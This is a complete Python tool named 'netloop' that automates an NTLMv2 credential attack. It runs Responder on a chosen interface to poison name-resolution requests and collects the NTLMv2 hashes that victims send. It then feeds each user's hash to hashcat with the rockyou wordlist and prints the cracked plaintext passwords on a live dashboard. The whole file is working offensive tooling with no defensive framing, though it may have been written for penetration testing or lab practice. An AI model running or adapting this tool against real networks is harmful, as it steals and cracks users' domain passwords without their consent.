#!/usr/bin/env python3
"""netloop: Wrapper automation for responder + hashcat NTLMv2 workflows."""

from __future__ import annotations

import argparse
import json
import os
import re
import select
import shlex
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple


HOME_CONFIG_PATH = Path.home() / ".netloop_config.json"
LOCAL_CONFIG_PATH = Path.cwd() / ".netloop_config.json"
DEFAULT_RESPONDER_FLAGS = "-wv"
DEFAULT_HASHCAT_FLAGS = "-m 5600"
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
HASH_FILE_GLOB = "*NTLMv2*.txt"
ANSI_RE = re.compile(r"\x1B\[[0-?]*[ -/]*[@-~]")
NTLMV2_IN_LINE_RE = re.compile(r"([^\s:]+::[^\s:]+:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]+)")


class Color:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def supports_color() -> bool:
    return sys.stdout.isatty() and os.environ.get("TERM", "") != "dumb"


def supports_inplace_redraw() -> bool:
    # Keep redraw behavior available in typical terminals (including sudo/root shells).
    # TERM-based detection is more reliable here than relying only on isatty().
    term = os.environ.get("TERM", "")
    return term not in ("", "dumb")


def c(text: str, color: str) -> str:
    if not supports_color():
        return text
    return f"{color}{text}{Color.RESET}"


@dataclass
class Stats:
    poisoned_messages: int = 0
    ntlmv2_hash_lines: int = 0
    unique_users: Set[str] = field(default_factory=set)
    user_to_hash: Dict[str, str] = field(default_factory=dict)
    seen_hashes: Set[str] = field(default_factory=set)


@dataclass
class CrackState:
    pending_users: List[str] = field(default_factory=list)
    queued_users: Set[str] = field(default_factory=set)
    processed_users: Set[str] = field(default_factory=set)
    active_user: Optional[str] = None
    active_hash_file: Optional[Path] = None
    active_proc: Optional[subprocess.Popen[str]] = None
    active_percent: float = 0.0
    active_rate_hps: float = 0.0
    active_status: str = "idle"
    cracked_lines: List[str] = field(default_factory=list)
    cracked_seen: Set[str] = field(default_factory=set)
    completed_jobs: int = 0
    hashcat_errors: int = 0


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def sanitize_for_filename(value: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", value)


def build_progress_bar(percent: float, width: int = 24) -> str:
    bounded = max(0.0, min(100.0, percent))
    fill = int((bounded / 100.0) * width)
    bar = "#" * fill + "-" * (width - fill)
    return f"[{bar}] {bounded:6.2f}%"


def parse_hashcat_progress(status_json: dict) -> Optional[float]:
    progress = status_json.get("progress")
    if isinstance(progress, list) and len(progress) >= 2:
        done, total = progress[0], progress[1]
        if isinstance(done, (int, float)) and isinstance(total, (int, float)) and total > 0:
            return float(done) * 100.0 / float(total)
    if isinstance(progress, (int, float)):
        total = status_json.get("progress_total")
        if isinstance(total, (int, float)) and total > 0:
            return float(progress) * 100.0 / float(total)
    return None


def parse_hashcat_rate_hps(status_json: dict) -> Optional[float]:
    speed_value = status_json.get("speed")
    if speed_value is None:
        speed_value = status_json.get("speed_sec")

    if isinstance(speed_value, (int, float)):
        return float(speed_value)

    if isinstance(speed_value, list):
        total = 0.0
        found = False
        for item in speed_value:
            if isinstance(item, (int, float)):
                total += float(item)
                found = True
            elif isinstance(item, list) and item:
                # Some hashcat status formats include [value, unit] tuples.
                val = item[0]
                if isinstance(val, (int, float)):
                    total += float(val)
                    found = True
        if found:
            return total
    return None


def humanize_hps(rate_hps: float) -> str:
    if rate_hps < 1_000:
        return f"{rate_hps:.0f} H/s"
    if rate_hps < 1_000_000:
        return f"{rate_hps / 1_000:.2f} kH/s"
    if rate_hps < 1_000_000_000:
        return f"{rate_hps / 1_000_000:.2f} MH/s"
    return f"{rate_hps / 1_000_000_000:.2f} GH/s"


def load_config() -> dict:
    config_path = HOME_CONFIG_PATH if HOME_CONFIG_PATH.exists() else LOCAL_CONFIG_PATH
    if not config_path.exists():
        return {}
    try:
        return json.loads(config_path.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_config(config: dict) -> None:
    try:
        HOME_CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
        return
    except OSError:
        # Fall back to local config when home is not writable.
        LOCAL_CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")


def prompt_with_default(prompt: str, default: str) -> str:
    value = input(f"{prompt} [{default}]: ").strip()
    return value or default


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="netloop automation utility")
    sub = parser.add_subparsers(dest="command", required=True)

    ntlmv2 = sub.add_parser("ntlmv2", help="capture and crack NTLMv2 hashes")
    ntlmv2.add_argument("-I", "--interface", help="network interface for responder")
    ntlmv2.add_argument("--responder-flags", help="extra responder flags")
    ntlmv2.add_argument("--wordlist", help="wordlist path for hashcat")
    ntlmv2.add_argument("--hashcat-flags", help="extra/default hashcat flags")
    ntlmv2.add_argument(
        "--auto-stop-seconds",
        type=int,
        default=0,
        help="optional timeout to stop responder automatically",
    )
    return parser


def parse_hash_line(line: str) -> Optional[Tuple[str, str]]:
    clean = strip_ansi(line).strip()
    if not clean:
        return None

    match = NTLMV2_IN_LINE_RE.search(clean)
    if match:
        clean = match.group(1)

    if "::" not in clean or clean.count(":") < 4:
        return None
    user = clean.split("::", 1)[0].strip()
    if not user:
        return None
    return user, clean


def ingest_hash(stats: Stats, user: str, full_hash: str) -> None:
    if full_hash in stats.seen_hashes:
        return
    stats.seen_hashes.add(full_hash)
    stats.ntlmv2_hash_lines += 1
    stats.unique_users.add(user)
    # Only keep the first observed hash for each user.
    stats.user_to_hash.setdefault(user, full_hash)


def parse_responder_stream_line(line: str, stats: Stats) -> None:
    clean_line = strip_ansi(line)
    if "Poisoned answer sent" in clean_line:
        stats.poisoned_messages += 1

    if "NTLMv2-SSP Hash" in clean_line:
        # Format example:
        # ... NTLMv2-SSP Hash     : user::DOMAIN:...
        if "NTLMv2-SSP Hash" not in clean_line:
            return
        candidate = clean_line.split("NTLMv2-SSP Hash", 1)[1].lstrip(" :")
        parsed = parse_hash_line(candidate)
        if parsed:
            ingest_hash(stats, parsed[0], parsed[1])


def discover_responder_log_paths(session_dir: Path) -> List[Path]:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    paths: List[Path] = []
    for base in candidate_dirs:
        session_log = base / "Responder-Session.log"
        if session_log.exists():
            paths.append(session_log)
    return paths


def poll_responder_logs(stats: Stats, offsets: Dict[Path, int], paths: List[Path]) -> None:
    for path in paths:
        try:
            with path.open("r", encoding="utf-8", errors="ignore") as handle:
                previous = offsets.get(path, 0)
                handle.seek(previous)
                for line in handle:
                    parse_responder_stream_line(line.rstrip("\n"), stats)
                offsets[path] = handle.tell()
        except OSError:
            continue


def read_hashes_from_files(session_dir: Path, stats: Stats) -> None:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    for base in candidate_dirs:
        if not base.exists():
            continue
        for hash_file in base.glob(HASH_FILE_GLOB):
            try:
                for raw in hash_file.read_text(encoding="utf-8", errors="ignore").splitlines():
                    parsed = parse_hash_line(raw)
                    if parsed:
                        ingest_hash(stats, parsed[0], parsed[1])
            except OSError:
                continue


def enqueue_new_hashes_for_cracking(stats: Stats, crack_state: CrackState) -> None:
    for user in sorted(stats.user_to_hash.keys()):
        if user in crack_state.processed_users:
            continue
        if user == crack_state.active_user:
            continue
        if user in crack_state.queued_users:
            continue
        crack_state.pending_users.append(user)
        crack_state.queued_users.add(user)


def start_next_hashcat_job(
    crack_state: CrackState,
    stats: Stats,
    hashcat_path: str,
    hashcat_flags: List[str],
    wordlist: str,
    session_dir: Path,
    session_name_prefix: str,
) -> None:
    if crack_state.active_proc is not None:
        return
    if not crack_state.pending_users:
        return

    user = crack_state.pending_users.pop(0)
    user_hash = stats.user_to_hash.get(user)
    if not user_hash:
        crack_state.queued_users.discard(user)
        return

    hash_dir = session_dir / "hash_inputs"
    hash_dir.mkdir(parents=True, exist_ok=True)
    safe_user = sanitize_for_filename(user)
    hash_file = hash_dir / f"{safe_user}.txt"
    hash_file.write_text(user_hash + "\n", encoding="utf-8")

    crack_state.active_user = user
    crack_state.active_hash_file = hash_file
    crack_state.active_percent = 0.0
    crack_state.active_status = "running"

    cmd = [
        hashcat_path,
        *hashcat_flags,
        "--session",
        f"{session_name_prefix}-{safe_user}-{int(time.time())}",
        "--restore-disable",
        "--status",
        "--status-json",
        "--status-timer",
        "1",
        "--potfile-path",
        str(session_dir / "netloop.potfile"),
        str(hash_file),
        wordlist,
    ]
    crack_state.active_proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )


def poll_hashcat_state(crack_state: CrackState) -> None:
    proc = crack_state.active_proc
    if proc is None or proc.stdout is None:
        return

    fd = proc.stdout.fileno()
    while True:
        ready, _, _ = select.select([fd], [], [], 0)
        if not ready:
            break
        line = proc.stdout.readline()
        if not line:
            break
        clean = strip_ansi(line).strip()
        if not clean:
            continue
        try:
            status_json = json.loads(clean)
        except json.JSONDecodeError:
            continue
        percent = parse_hashcat_progress(status_json)
        if percent is not None:
            crack_state.active_percent = percent
            crack_state.active_status = str(status_json.get("status", "running"))
        rate_hps = parse_hashcat_rate_hps(status_json)
        if rate_hps is not None:
            crack_state.active_rate_hps = rate_hps


def finalize_hashcat_job(
    crack_state: CrackState,
    hashcat_path: str,
    hashcat_flags: List[str],
) -> None:
    proc = crack_state.active_proc
    user = crack_state.active_user
    hash_file = crack_state.active_hash_file
    if proc is None or user is None or hash_file is None:
        return

    if proc.stdout is not None:
        # Drain remaining output, harvesting final status JSON if present.
        for line in proc.stdout:
            clean = strip_ansi(line).strip()
            if not clean:
                continue
            try:
                status_json = json.loads(clean)
            except json.JSONDecodeError:
                continue
            percent = parse_hashcat_progress(status_json)
            if percent is not None:
                crack_state.active_percent = percent
                crack_state.active_status = str(status_json.get("status", crack_state.active_status))
            rate_hps = parse_hashcat_rate_hps(status_json)
            if rate_hps is not None:
                crack_state.active_rate_hps = rate_hps

    rc = proc.wait()
    if rc != 0:
        crack_state.hashcat_errors += 1

    show_cmd = [hashcat_path, *hashcat_flags, "--show", str(hash_file)]
    show_proc = subprocess.run(show_cmd, text=True, capture_output=True)
    for row in show_proc.stdout.splitlines():
        clean_row = strip_ansi(row).strip()
        if not clean_row:
            continue
        if clean_row in crack_state.cracked_seen:
            continue
        crack_state.cracked_seen.add(clean_row)
        crack_state.cracked_lines.append(clean_row)

    crack_state.completed_jobs += 1
    crack_state.processed_users.add(user)
    crack_state.queued_users.discard(user)
    crack_state.active_user = None
    crack_state.active_hash_file = None
    crack_state.active_proc = None
    crack_state.active_percent = 0.0
    crack_state.active_rate_hps = 0.0
    crack_state.active_status = "idle"


def render_stats(stats: Stats, live: bool = False) -> None:
    prefix = "LIVE" if live else "FINAL"
    status = (
        f"{c(prefix, Color.CYAN)} | "
        f"Poisoned: {c(str(stats.poisoned_messages), Color.YELLOW)} | "
        f"NTLMv2 Captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)} | "
        f"Unique Users: {c(str(len(stats.unique_users)), Color.BLUE)}"
    )
    print(status)


def render_live_dashboard(
    stats: Stats,
    crack_state: CrackState,
    interface: str,
    responder_flags: str,
    started_at: float,
    auto_stop_seconds: int,
) -> List[str]:
    elapsed = int(time.time() - started_at)
    timer_text = f"{elapsed}s"
    if auto_stop_seconds > 0:
        remaining = max(0, auto_stop_seconds - elapsed)
        timer_text = f"{elapsed}s elapsed | {remaining}s to auto-stop"

    cracking_line = c("Cracking: idle", Color.YELLOW)
    if crack_state.active_user:
        bar = build_progress_bar(crack_state.active_percent)
        rate_text = humanize_hps(crack_state.active_rate_hps)
        cracking_line = (
            f"Cracking user: {c(crack_state.active_user, Color.CYAN)} "
            f"{c(bar, Color.GREEN)} | Rate: {c(rate_text, Color.BLUE)}"
        )

    queue_depth = len(crack_state.pending_users) + (1 if crack_state.active_user else 0)
    recent_cracks = crack_state.cracked_lines[-2:]
    recent_lines = [f"  {line}" for line in recent_cracks] if recent_cracks else ["  none yet"]

    return [
        c("Netloop Live Overview", Color.BOLD),
        f"Mode: NTLMv2 capture/crack | Interface: {interface}",
        f"Responder Flags: {responder_flags}",
        f"Runtime: {timer_text}",
        "",
        f"Poisoned messages: {c(str(stats.poisoned_messages), Color.YELLOW)}",
        f"NTLMv2 hashes captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)}",
        f"Unique users captured: {c(str(len(stats.unique_users)), Color.BLUE)}",
        "",
        cracking_line,
        (
            f"Crack queue: {queue_depth} | Completed jobs: {crack_state.completed_jobs} | "
            f"Cracked: {len(crack_state.cracked_lines)}"
        ),
        "Recent cracked:",
        *recent_lines,
        "",
        c("Ctrl-C: stop responder capture (cracking continues).", Color.CYAN),
    ]


def draw_live_dashboard(lines: List[str], previous_line_count: int) -> int:
    if not supports_inplace_redraw():
        # Fallback when not attached to an interactive terminal.
        print(" | ".join(line for line in lines if line.strip()))
        return len(lines)

    if previous_line_count > 0:
        # Move up to start of prior dashboard block (widely-supported ANSI sequence).
        sys.stdout.write(f"\033[{previous_line_count}A\r")

    for line in lines:
        # Clear current line then print replacement.
        sys.stdout.write("\033[2K" + line + "\n")

    if previous_line_count > len(lines):
        for _ in range(previous_line_count - len(lines)):
            sys.stdout.write("\033[2K\n")

    sys.stdout.flush()
    return len(lines)


def run_capture_and_crack(
    interface: str,
    responder_flags: str,
    wordlist: str,
    hashcat_flags: str,
    session_dir: Path,
    stats: Stats,
    auto_stop_seconds: int,
) -> Tuple[int, CrackState]:
    responder_path = shutil.which("responder")
    if not responder_path:
        print(c("Error: responder not found in PATH.", Color.RED))
        return 127, CrackState()

    hashcat_path = shutil.which("hashcat")
    hashcat_missing_warned = False

    cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
    print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))

    interrupted = False
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        cwd=str(session_dir),
        bufsize=1,
    )

    start = time.time()
    session_name_prefix = f"netloop-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    parsed_hashcat_flags = shlex.split(hashcat_flags)
    crack_state = CrackState()
    responder_logs = discover_responder_log_paths(session_dir)
    log_offsets: Dict[Path, int] = {}
    for log_path in responder_logs:
        try:
            log_offsets[log_path] = log_path.stat().st_size
        except OSError:
            log_offsets[log_path] = 0

    dashboard_lines = render_live_dashboard(
        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
    )
    dashboard_height = draw_live_dashboard(dashboard_lines, previous_line_count=0)
    auto_stop_triggered = False
    last_refresh = 0.0
    responder_stop_requested = False
    interrupted = False

    try:
        assert proc.stdout is not None
        fd = proc.stdout.fileno()
        while True:
            try:
                if proc.poll() is None:
                    ready, _, _ = select.select([fd], [], [], 0.20)
                    if ready:
                        line = proc.stdout.readline()
                        if line:
                            parse_responder_stream_line(line.rstrip("\n"), stats)
                poll_responder_logs(stats, log_offsets, responder_logs)

                enqueue_new_hashes_for_cracking(stats, crack_state)

                if hashcat_path and Path(wordlist).exists():
                    if crack_state.active_proc is None:
                        start_next_hashcat_job(
                            crack_state,
                            stats,
                            hashcat_path,
                            parsed_hashcat_flags,
                            wordlist,
                            session_dir,
                            session_name_prefix,
                        )
                    poll_hashcat_state(crack_state)
                    if crack_state.active_proc and crack_state.active_proc.poll() is not None:
                        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)
                else:
                    if not hashcat_missing_warned:
                        hashcat_missing_warned = True
                        if not hashcat_path:
                            print(c("Warning: hashcat not found in PATH. Capture only mode.", Color.YELLOW))
                        elif not Path(wordlist).exists():
                            print(c(f"Warning: wordlist not found: {wordlist}. Capture only mode.", Color.YELLOW))

                now = time.time()
                if now - last_refresh >= 1.0:
                    dashboard_lines = render_live_dashboard(
                        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
                    )
                    dashboard_height = draw_live_dashboard(
                        dashboard_lines, previous_line_count=dashboard_height
                    )
                    last_refresh = now

                if (
                    proc.poll() is None
                    and auto_stop_seconds > 0
                    and now - start >= auto_stop_seconds
                ):
                    auto_stop_triggered = True
                    responder_stop_requested = True
                    proc.send_signal(signal.SIGINT)

                if responder_stop_requested and proc.poll() is None:
                    proc.send_signal(signal.SIGINT)

                responder_finished = proc.poll() is not None
                cracking_finished = crack_state.active_proc is None and not crack_state.pending_users
                if responder_finished and cracking_finished:
                    break
            except KeyboardInterrupt:
                # First Ctrl-C: stop only responder; keep cracking queue alive.
                if not responder_stop_requested and proc.poll() is None:
                    interrupted = True
                    responder_stop_requested = True
                    proc.send_signal(signal.SIGINT)
                    continue
                # Second Ctrl-C: hard stop everything.
                interrupted = True
                if proc.poll() is None:
                    proc.send_signal(signal.SIGINT)
                if crack_state.active_proc and crack_state.active_proc.poll() is None:
                    crack_state.active_proc.send_signal(signal.SIGINT)
                break
    except KeyboardInterrupt:
        interrupted = True
        proc.send_signal(signal.SIGINT)
    finally:
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    if crack_state.active_proc and crack_state.active_proc.poll() is not None and hashcat_path:
        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)

    # Move to a clean line after in-place dashboard rendering and print stop reason.
    print()
    if auto_stop_triggered:
        print(c("Auto-stop timer reached. Stopping responder.", Color.YELLOW))
    elif interrupted:
        print(c("Capture stopped by user.", Color.YELLOW))

    if interrupted and proc.returncode is None:
        return 130, crack_state
    return (proc.returncode or 0), crack_state


def format_cracked_rows(rows: List[str]) -> List[str]:
    formatted: List[str] = []
    for row in rows:
        if ":" not in row:
            formatted.append(row)
            continue
        hash_part, plain = row.rsplit(":", 1)
        user = hash_part.split("::", 1)[0]
        formatted.append(f"{user}: {plain}")
    return formatted


def resolve_inputs(parsed_args: argparse.Namespace) -> Tuple[str, str, str, str]:
    cfg = load_config()
    ntlmv2_cfg = cfg.get("ntlmv2", {})

    interface = parsed_args.interface
    if not interface:
        interface_default = ntlmv2_cfg.get("interface", "tun0")
        interface = prompt_with_default("Interface", interface_default)

    responder_flags = parsed_args.responder_flags
    if responder_flags is None:
        responder_flags = prompt_with_default(
            "Responder Flags",
            ntlmv2_cfg.get("responder_flags", DEFAULT_RESPONDER_FLAGS),
        )

    wordlist = parsed_args.wordlist
    if wordlist is None:
        wordlist = prompt_with_default("Wordlist", ntlmv2_cfg.get("wordlist", DEFAULT_WORDLIST))

    hashcat_flags = parsed_args.hashcat_flags
    if hashcat_flags is None:
        hashcat_flags = prompt_with_default(
            "Hashcat Flags",
            ntlmv2_cfg.get("hashcat_flags", DEFAULT_HASHCAT_FLAGS),
        )

    cfg["ntlmv2"] = {
        "interface": interface,
        "responder_flags": responder_flags,
        "wordlist": wordlist,
        "hashcat_flags": hashcat_flags,
    }
    save_config(cfg)
    return interface, responder_flags, wordlist, hashcat_flags


def write_unique_hash_file(session_dir: Path, user_to_hash: Dict[str, str]) -> Path:
    out = session_dir / "unique_ntlmv2_hashes.txt"
    lines = [user_to_hash[user] for user in sorted(user_to_hash.keys())]
    out.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
    return out


def main() -> int:
    parser = build_parser()
    parsed_args = parser.parse_args()

    if parsed_args.command != "ntlmv2":
        print(c("Only 'ntlmv2' command is currently implemented.", Color.RED))
        return 2

    interface, responder_flags, wordlist, hashcat_flags = resolve_inputs(parsed_args)
    session_stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    session_dir = Path.cwd() / "netloop_runs" / session_stamp
    session_dir.mkdir(parents=True, exist_ok=True)
    print(c(f"Session directory: {session_dir}", Color.CYAN))

    stats = Stats()
    responder_rc, crack_state = run_capture_and_crack(
        interface,
        responder_flags,
        wordlist,
        hashcat_flags,
        session_dir,
        stats,
        parsed_args.auto_stop_seconds,
    )

    # Pull hashes from responder output files too, not just stdout.
    read_hashes_from_files(session_dir, stats)

    print()
    render_stats(stats, live=False)
    print(c(f"Responder exited with code: {responder_rc}", Color.CYAN))

    if not stats.user_to_hash:
        print(c("No NTLMv2 hashes captured. Nothing to crack.", Color.YELLOW))
        return 0 if responder_rc in (0, 130) else responder_rc

    unique_hash_file = write_unique_hash_file(session_dir, stats.user_to_hash)
    cracked_display = format_cracked_rows(crack_state.cracked_lines)
    crack_rc = 0 if crack_state.hashcat_errors == 0 else 1

    print("\n" + c("Overview", Color.BOLD))
    print(f"- Poisoned messages: {stats.poisoned_messages}")
    print(f"- NTLMv2 hashes captured: {stats.ntlmv2_hash_lines}")
    print(f"- Unique users with captured hashes: {len(stats.unique_users)}")
    print(f"- Hash input file (one per user): {unique_hash_file}")
    print(f"- Hashcat jobs completed: {crack_state.completed_jobs}")
    print(f"- Hashcat job errors: {crack_state.hashcat_errors}")
    print(f"- Hashcat status code: {crack_rc}")

    if cracked_display:
        print(c("\nCracked hashes:", Color.GREEN))
        for row in cracked_display:
            print(f"  - {row}")
    else:
        print(c("\nNo cracked hashes yet.", Color.YELLOW))

    return 0 if crack_rc == 0 else crack_rc


if __name__ == "__main__":
    sys.exit(main())
